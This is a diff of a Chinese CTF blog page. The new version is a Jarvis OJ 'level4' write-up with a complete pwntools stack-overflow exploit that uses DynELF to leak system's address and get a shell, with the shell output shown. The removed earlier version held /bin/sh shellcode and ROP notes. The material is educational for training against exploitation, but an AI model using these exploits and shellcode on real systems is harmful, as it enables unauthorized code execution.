@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     
     
-    <title>pwn 入门1.1 | Room of Equirement | pwn what you want</title>
+    <title>Jarvis OJ-pwn | Room of Equirement | pwn what you want</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="keywords" content="pwn">
@@ -171,7 +171,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>pwn 入门1.1</span>
+            <span>Jarvis OJ-pwn</span>
             
         </div>
         
@@ -184,11 +184,11 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">pwn 入门1.1</h1>
+        <h1 class="title">Jarvis OJ-pwn</h1>
         <h5 class="subtitle">
             
-                <time datetime="2018-08-13T14:35:13.000Z" itemprop="datePublished" class="page-time">
-  2018-08-13
+                <time datetime="2018-09-13T06:17:19.000Z" itemprop="datePublished" class="page-time">
+  2018-09-13
 </time>
 
 
@@ -215,12 +215,12 @@
 
 
 <div class="container body-wrap">
-    <article id="post-pwn-入门1-1"
+    <article id="post-jarvis-oj-pwn"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">pwn 入门1.1</h1>
+        <h1 class="post-card-title">Jarvis OJ-pwn</h1>
         <div class="post-meta">
-            <time class="post-time" title="2018-08-13 22:35:13" datetime="2018-08-13T14:35:13.000Z"  itemprop="datePublished">2018-08-13</time>
+            <time class="post-time" title="2018-09-13 14:17:19" datetime="2018-09-13T06:17:19.000Z"  itemprop="datePublished">2018-09-13</time>
 
             
 
@@ -234,58 +234,28 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol>
-<li>stack：局部变量</li>
-<li>heap: 动态分配内存的变量（malloc/new）</li>
-<li>bss section: 全局化的未初始化的变量</li>
-<li>data section: 全局化的已初始化的变量<ul>
-<li>rodata: （只读data段）全局化的静态变量（const）</li>
-</ul>
-</li>
-</ol>
-<p>例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">	char *d = malloc(16);    //heap</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
-<p>2.一系列步骤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure>
-<p>3.带入调用shellcode的程序test.c</p>
-<pre><code>#include  &quot;code.h&quot;
+            <p><em>开始漫漫刷题之路</em></p>
+<h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p>
+<h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>
 
-typedef int(*CODE)();
-
-int main()
-{
-    ((CODE)shellcode)();
-}
-
-Run Shellcode: gcc test.c -o test -m32 -zexexstack       
-</code></pre><p><em>syscalls.kernelgrok.com linux下的系统调用.</em></p>
-<h1 id="之前的一些小知识点笔记："><a href="#之前的一些小知识点笔记：" class="headerlink" title="之前的一些小知识点笔记："></a>之前的一些小知识点笔记：</h1><p>gadget :一小段以ret结尾的code</p>
-<p>rop chain ：串联在一起的gadget</p>
-<p>rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）.</p>
-<p>rop关键：</p>
-<p>查找gadget：</p>
-<pre><code>ROPgadget --binary ./file
-
-ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
-</code></pre><p>排列gadget：</p>
-<p>peda：vmmap 查看程序段的可读写执行情况</p>
-<p>也可以：./file &amp;  (后台运行，返回pid0）</p>
-<pre><code>cat  /proc/pid0/maps
-</code></pre>
         </div>
         
 <blockquote class="post-copyright">
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2018-09-11T03:33:42.581Z" itemprop="dateUpdated">2018-09-11 11:33:42</time>
+    Last updated: <time datetime="2018-09-13T10:04:44.235Z" itemprop="dateUpdated">2018-09-13 18:04:44</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2018/08/13/pwn-入门1-1/" target="_blank" rel="external">http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/</a>
+        转载注明出处，原文地址：<a href="/2018/09/13/jarvis-oj-pwn/" target="_blank" rel="external">http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/</a>
         
     </div>
     <footer>
@@ -314,7 +284,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/&title=《pwn 入门1.1》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -326,7 +296,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/&title=《pwn 入门1.1》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -349,16 +319,16 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2018/08/13/markdown规范学习/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">markdown规范学习</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
+  
+    <div class="next">
+      <a href="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">pwn-300解析-格式化字符串漏洞利用巩固</h4>
+      </a>
+    </div>
   
 </nav>
 
@@ -368,7 +338,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#各种变量的存储位置"><span class="post-toc-number">1.</span> <span class="post-toc-text">各种变量的存储位置</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux下将shellcode运行"><span class="post-toc-number">2.</span> <span class="post-toc-text">linux下将shellcode运行</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#之前的一些小知识点笔记："><span class="post-toc-number"></span> <span class="post-toc-text">之前的一些小知识点笔记：</span></a>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level4-DynELF"><span class="post-toc-number">1.</span> <span class="post-toc-text">level4 - DynELF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#poc"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">poc</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level3-x64-64位参数传递"><span class="post-toc-number">2.</span> <span class="post-toc-text">level3_x64 - 64位参数传递</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
@@ -454,7 +424,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/&title=《pwn 入门1.1》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -466,7 +436,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/&title=《pwn 入门1.1》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -478,7 +448,7 @@ ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACM0lEQVR42u3ay46jMBAF0Pz/T2e2M+pA31smI2GOV63QgA+LkuvxesXr/WP9/P3o/2dveX1jYWBg3JbxPl3njL+vHj05/xD51Q9vxMDAeAAj2URyNb/rPHLme8PAwMBoQ+fsWDl7JgYGBka7xTzgzkI5BgYGRh74clIbxJPgfkEujoGBcUNGXnX//39/pb+BgYFxK8a7XLNjYhIu87s+PAcDA2NrRlusH6aXZbNhth8MDIy9GUm4XEk1Z6W68+0eUjEwMLZjrIxTrB/71j/iPydcDAyMTRn5Fs/HJnJ2e/QsSm8YGBgPYORhcVYmSyr5eRp8GHAxMDC2ZqwklishtdhokoVjYGBsypgljcnVbwyB/fIhMDAwtmO04xF5cpuH47zkd/jRMTAwtmbkl/Nm5Erzsj041rMYGBgYN2S05bMZbHY0rBNXDAyMTRkr6WVb4m/bohcMW2BgYGzEmCWWSRBMEteVt2BgYGC0t10VUofDFhgYGFsz2oRzpSXQNimLYhwGBsZjGLOG4sphbtbs/PALBgbGwxh5G7JNRPPSf9t4wMDAeAIjT19nQxL5u5ISHgYGxnMY73Llh8LkCbNmZyTDwMDYiHFBtC6Tz/Xg3rZRMTAw9mDMivVt+awd0agDLgYGxgMYbcKZ37U+YBE1JzAwMDDKFHR2rFxKWTEwMDAWhr3yhmXeTvilv4GBgbEpIx9FbYcn8qbC7C4MDIwnMNpzV9t6zDeRHzEvOD5iYGDcg/EHCe36CMFvdUkAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACIUlEQVR42u3aS27DMAwFwNz/0u62QFvnkZILhBqtikRpNF4w/Oj1itf1bf18Pd/f+5ZtCwMD42MZ1+36a0/yxdX/kL/7yzdiYGAcwEgOcX+g+0/1XknOhoGBgXG/Jw+7fwXTfA8GBgZGL+AmO3tgDAwMjF4Rm6R0SWheL3ExMDBOY+Rd9///+5H5BgYGxkcxruKqFpx5uLwWFgYGxmxGHuCWysvi2KB3HgwMjBMYu4JvteDswcq1OAYGxocz8pZ90iZLLk/00s3oOhoGBsY4Rn4BIjl0+ckFqWfUesPAwBjNyINmlZ031/IR6X1oxsDAmMpIAlwOeyKkRm0+DAyM0YxeElYdQ1YTx145jYGBMZXRS+x6V8dWRp5vfgYwMDBGM6qN+2ToWE0oe+PMQp6LgYHx4YxdSV6S3vU+FV1cw8DAGM1YuVWVHzd/NL3Hh4GBcSYjb4RV07snSlwMDIzZjF4J2ksKq4lg4V0MDIzRjGrQzNO7nNTb/6ZriIGBMZSx94h5TpoPTd8kphgYGAcw8oZaL31cubnWvGyBgYExjpGUjivXv/JmXF42Y2BgnMC4imvXMLJaKkfTDAwMjKGMlXtWTyR8e4M7BgbGJEYeZFd4+fNrBlwMDIwDGHsD5d5xQvlGGwYGBkaLlwwYkmHAIwEXAwNjHGP98kT1iOVJLAYGxlBGtd2/q6FfLXExMDDOZFRLx15IrR5i5WcAAwNjEOMLamZgvktrlW0AAAAASUVORK5CYII=" alt="微信分享二维码">
 </div>
 
 
